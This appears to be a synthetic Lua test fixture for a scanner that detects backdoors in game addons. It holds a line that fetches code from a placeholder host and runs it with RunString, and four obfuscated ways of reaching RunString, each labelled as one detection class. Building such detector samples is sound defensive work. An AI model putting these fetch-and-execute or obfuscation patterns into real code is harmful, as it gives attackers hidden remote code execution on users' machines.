-- Synthetic sample for the CI smoke test. Nothing here is functional.
-- Each line below is meant to trigger exactly one detection class.

http.Fetch("http://example.invalid/payload",
    function(body, len, headers, code)
        RunString(body)
    end)

local a = _G["RunStr" .. "ing"]
local b = _G[string.char(82, 117, 110, 83, 116, 114, 105, 110, 103)]
local c = _G["\x52\x75\x6e\x53\x74\x72\x69\x6e\x67"]
local d = _G[("gnirtSnuR"):reverse()]

-- RunString("this line is a comment and must NOT be reported")
